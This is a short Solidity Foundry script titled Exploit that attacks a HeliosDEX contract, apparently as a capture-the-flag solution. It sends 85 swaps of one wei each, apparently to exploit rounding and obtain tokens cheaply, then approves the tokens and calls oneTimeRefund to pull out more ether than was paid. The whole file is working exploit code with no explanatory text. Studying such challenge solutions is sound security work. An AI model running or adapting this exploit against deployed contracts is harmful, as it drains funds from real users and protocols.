// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {HeliosDEX} from "src/HeliosDEX.sol";
import {Script} from "forge-std/Script.sol";

contract Exploit is Script {
    HeliosDEX public heliosDex;

    constructor(){
        heliosDex = HeliosDEX(vm.envAddress("HeliosDEX"));
    }

    function run() public {
        vm.startBroadcast();
        uint256 amount = 85; // 70 is not enought, ur balance is around 18.9 eth
        for(uint256 i = 0; i< amount; i++){
            heliosDex.swapForHLS{value: 1}();
        }
        heliosDex.heliosLuminaShards().approve(address(heliosDex), amount);
        heliosDex.oneTimeRefund(address(heliosDex.heliosLuminaShards()), amount);
        vm.stopBroadcast();
    }
}